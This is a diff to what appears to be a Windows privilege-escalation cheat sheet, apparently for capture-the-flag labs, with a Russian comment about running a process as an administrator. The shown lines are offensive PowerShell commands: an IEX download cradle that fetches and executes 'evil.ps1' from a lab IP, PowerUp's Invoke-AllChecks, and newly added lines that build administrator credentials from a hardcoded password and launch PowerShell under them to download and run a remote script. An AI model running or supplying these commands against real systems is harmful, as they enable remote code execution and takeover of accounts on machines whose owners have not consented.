@@ -78,3 +78,9 @@ IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/evil.ps1')
 PowerUP
 
 Invoke-AllChecks
+
+# Запуск процесса от имени другого пользователя (администратора)
+
+$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('administrator', $passwd)
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://<LAB IP>/writeup')" -Credential $creds
